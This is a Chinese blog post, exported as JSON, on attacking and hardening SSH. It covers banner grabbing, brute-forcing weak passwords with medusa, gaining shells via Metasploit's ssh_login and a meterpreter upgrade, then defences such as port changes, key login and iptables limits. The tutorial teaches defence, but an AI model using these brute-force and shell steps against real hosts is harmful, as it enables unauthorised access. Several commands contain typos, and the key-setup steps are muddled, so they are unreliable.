{"title":"ssh漏洞利用","uid":"68847bc4d9b92f6bbe7e25411fa69ec3","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","updated":"2021-10-17T05:42:02.930Z","comments":true,"path":"api/articles/ssh漏洞利用.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"SSH（安全外壳协议）\"><a href=\"#SSH（安全外壳协议）\" class=\"headerlink\" title=\"SSH（安全外壳协议）\"></a>SSH（安全外壳协议）</h2><p>SSH 为 [Secure Shell](<a href=\"https://baike.baidu.com/item/Secure\">https://baike.baidu.com/item/Secure</a> Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为<a href=\"https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/1071998\">远程登录</a>会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。<a href=\"https://baike.baidu.com/item/SSH%E5%AE%A2%E6%88%B7%E7%AB%AF/7091372\">SSH客户端</a>适用于多种平台。几乎所有UNIX平台—包括<a href=\"https://baike.baidu.com/item/HP-UX\">HP-UX</a>、<a href=\"https://baike.baidu.com/item/Linux\">Linux</a>、<a href=\"https://baike.baidu.com/item/AIX\">AIX</a>、<a href=\"https://baike.baidu.com/item/Solaris/3517\">Solaris</a>、<a href=\"https://baike.baidu.com/item/Digital\">Digital</a> <a href=\"https://baike.baidu.com/item/UNIX\">UNIX</a>、<a href=\"https://baike.baidu.com/item/Irix\">Irix</a>，以及其他平台，都可运行SSH。</p>\n<h2 id=\"SSH安装\"><a href=\"#SSH安装\" class=\"headerlink\" title=\"SSH安装\"></a>SSH安装</h2><p>我们使用ubuntu下载openssh_service服务</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo apt-get install openssh-server </code></pre>\n\n<p>完成后使用以下命令开启关闭ssh服务</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">service ssh start #启动ssh服务\nservice ssh status #状态获取\nservice ssh stop  #关闭ssh服务</code></pre>\n\n<h2 id=\"SSH客户端安装\"><a href=\"#SSH客户端安装\" class=\"headerlink\" title=\"SSH客户端安装\"></a>SSH客户端安装</h2><p>使用ubuntu搭建ssh客户端</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo apt-get install putty-tools</code></pre>\n\n<p>然后太ubuntu的软件中心找到putty并且安装，之后使用客户端连接服务端。</p>\n<h2 id=\"SSH-banner信息获取\"><a href=\"#SSH-banner信息获取\" class=\"headerlink\" title=\"SSH banner信息获取\"></a>SSH banner信息获取</h2><ol>\n<li>nmap获取ssh banner信息</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap -sV -p 22 IP地址</code></pre>\n\n<ol start=\"2\">\n<li>metasploit获取ssh banner信息</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfconsole\nuse auxiliary&#x2F;sacnner&#x2F;ssh&#x2F;ssh_version    \nset rhosts IP地址\nset rport 22\nrun</code></pre>\n\n<ol start=\"3\">\n<li>nc获取ssh banner 信息</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc IP地址 22</code></pre>\n\n<h2 id=\"配置ssh规避banner信息\"><a href=\"#配置ssh规避banner信息\" class=\"headerlink\" title=\"配置ssh规避banner信息\"></a>配置ssh规避banner信息</h2><p>在ssh配置文件sshd_config中新增一行</p>\n<p>Debian Banner no  再次扫描就没有操作系统信息</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\ncrtl+f 输入banner 在下面加上\nDebian Banner no  保存\nsevice ssh restart </code></pre>\n\n<h2 id=\"medusa-ssh-弱口令破解\"><a href=\"#medusa-ssh-弱口令破解\" class=\"headerlink\" title=\"medusa ssh 弱口令破解\"></a>medusa ssh 弱口令破解</h2><p>如果在设置ssh服务时，管理员设置了容易破解出来的用户名和密码，那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">medusa\nmedusa -d   #查看支持模块\nmedusa -h IP地址 -u 用户名 -p 字典路径 -M 模块   #进行破解\nsucess表示破解成功</code></pre>\n\n<h2 id=\"SSH命令行工具登录\"><a href=\"#SSH命令行工具登录\" class=\"headerlink\" title=\"SSH命令行工具登录\"></a>SSH命令行工具登录</h2><p>一般情况下Linux下都具有ssh客户端，用来登陆ssh服务端。可以使用ssh用户名@IP地址，然后根据提示输入密码。（默认22端口）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ssh 用户名@IP地址</code></pre>\n\n<h2 id=\"metasploit利用ssh登陆反弹shell\"><a href=\"#metasploit利用ssh登陆反弹shell\" class=\"headerlink\" title=\"metasploit利用ssh登陆反弹shell\"></a>metasploit利用ssh登陆反弹shell</h2><p>使用metasploit可以进行ssh登陆(破解)，会自动建立对应的Bash shell连接。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfconsole\nuse auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login\nset rhosts IP地址\nset username xxx\nset password xxx\nrun\n成功后\nsessions -l\nsesssions -i 1\n成功登陆</code></pre>\n\n<h2 id=\"metasploit获取meterpreter-shell\"><a href=\"#metasploit获取meterpreter-shell\" class=\"headerlink\" title=\"metasploit获取meterpreter shell\"></a>metasploit获取meterpreter shell</h2><p>利用获取的Bash shell，注入metasploit中meterpreter payload从而获取更强大功能的shell。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sessions -u 1\nsessions -i id\n使用后面登陆成功\nhelp  #查看可以使用的命令</code></pre>\n\n<h2 id=\"SSH安全防御\"><a href=\"#SSH安全防御\" class=\"headerlink\" title=\"SSH安全防御\"></a>SSH安全防御</h2><ol>\n<li>ssh修改默认端口</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\nctrl+f  找端口port\n将端口port修改为其他端口，如：2222\nservice ssh restart  重启ssh服务，使修改生效</code></pre>\n\n<ol start=\"2\">\n<li>ssh设置pgp登陆</li>\n</ol>\n<p>在默认情况下，ssh使用用户名和密码进行远程登陆，但也可以使用密钥对进行身份验证登录。(公钥和私钥)</p>\n<p>生成ssh密钥对，使用puttygen</p>\n<p>下载：<a href=\"https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html\">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a>  可能不对，<strong>直接360下载。ok</strong></p>\n<p>打开puttygen生成私钥，保存到桌面private.ppk。使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys.并复制私钥文件到.ssh目录下。使用putty -l命令将内容拷贝到authorized_keys中。之后通过putty加载私钥文件进行ssh连接。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ssh-keygen -t rsa  之后一之前确定，自动生成.ssh目录\nls -alh  查看所有文件\ncd .ssh \ntouch authrized_keys   生成文件\n将private.ppk拷贝到.ssh目录下\nputtygen -L private.ppk   查看内容，之后我们将内容复制\ngedit authorized_keys   打开后，我们将复制内容放进去</code></pre>\n\n<p>完成后使用win10刚刚360下载好的putty客户端加载私钥文件进行连接。</p>\n<p>在<strong>Auth</strong>里加载文件。</p>\n<p>输入IP地址和端口（刚刚已经改为了2222）</p>\n<p>直接连接。</p>\n<ol start=\"3\">\n<li>ssh防御暴力破解用户账号</li>\n</ol>\n<p>在Linux下可以配置不能使用用户名和密码登陆。只使用ssh pgp方式验证登陆。规避了ssh暴力破解。</p>\n<p>问题：不适用用户名和密码登陆，很大程度上存在复杂操作问题。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;etc&#x2F;ssh&#x2F;\nsudo gedit sshd_config\nctrl+f  输入password Authentication\n将yes改为no  保存退出\nservice ssh restart  重启服务</code></pre>\n\n<ol start=\"4\">\n<li>Iptable设置阈值防止暴力破解</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -mrecent --set\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -m recent --updata --seconds 120 --hitcount 3 -jDROP  #3次密码不对就暂停连接120秒，也可修改时间\nservice ssh restate  #重启服务</code></pre>\n\n<p>表示连接3次不对，停止接收数据包防止暴力破解。最好还是要设置复杂密码，防止被字典跑出来。</p>\n<p>毕竟我曾经在群里看到一个变态跑了一年跑出来了。。。。。。。</p>\n<p>因为安全方面设置好了，前面就没有截图。不过步骤都写的很清楚了。。。</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw2000/0089olAbly1gtov5zise9j607i07i0sr02.jpg\"></p>\n","text":" SSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。S...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":6,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","count":3,"path":"api/tags/基础漏洞.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSH%EF%BC%88%E5%AE%89%E5%85%A8%E5%A4%96%E5%A3%B3%E5%8D%8F%E8%AE%AE%EF%BC%89\"><span class=\"toc-text\">SSH（安全外壳协议）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSH%E5%AE%89%E8%A3%85\"><span class=\"toc-text\">SSH安装</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSH%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85\"><span class=\"toc-text\">SSH客户端安装</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSH-banner%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">SSH banner信息获取</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%85%8D%E7%BD%AEssh%E8%A7%84%E9%81%BFbanner%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">配置ssh规避banner信息</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#medusa-ssh-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">medusa ssh 弱口令破解</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSH%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E7%99%BB%E5%BD%95\"><span class=\"toc-text\">SSH命令行工具登录</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#metasploit%E5%88%A9%E7%94%A8ssh%E7%99%BB%E9%99%86%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">metasploit利用ssh登陆反弹shell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#metasploit%E8%8E%B7%E5%8F%96meterpreter-shell\"><span class=\"toc-text\">metasploit获取meterpreter shell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSH%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1\"><span class=\"toc-text\">SSH安全防御</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Telnet漏洞","uid":"ee30e4a54bdc40c81ca3faa91eadc5d4","slug":"Telnet漏洞","date":"2021-10-24T13:44:27.000Z","updated":"2021-10-24T14:29:28.312Z","comments":true,"path":"api/articles/Telnet漏洞.json","keywords":null,"cover":[],"text":" Telnet介绍(直接复制粘贴) Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中...","link":"","photos":[],"count_time":{"symbolsCount":"2.3k","symbolsTime":"2 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":6,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","count":3,"path":"api/tags/基础漏洞.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"FTP漏洞利用","uid":"add830c1c066eef908d48bdb9bf71238","slug":"FTP漏洞利用","date":"2021-10-07T07:38:38.000Z","updated":"2021-10-08T10:30:11.256Z","comments":true,"path":"api/articles/FTP漏洞利用.json","keywords":null,"cover":[],"text":" ​ 开始记录一个安全漏洞利用 FTP协议文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。 FTP用户分类 Real 一般用户 Administr...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":6,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","count":3,"path":"api/tags/基础漏洞.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}